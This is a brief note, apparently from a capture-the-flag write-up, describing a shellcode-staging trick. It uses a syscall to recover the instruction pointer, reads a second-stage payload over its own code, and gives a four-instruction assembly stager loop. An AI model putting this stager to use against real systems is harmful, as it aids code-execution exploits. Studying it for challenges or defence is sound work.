## idea
a bad syscall will set rip to rcx, so here is steps:  

- gets rip 
- use read syscall to overwrite opcode
- send real shellcode

a prime code example  like this

	start:
	    syscall
	    dec edx
	    mov esi,ecx
	    jmp start
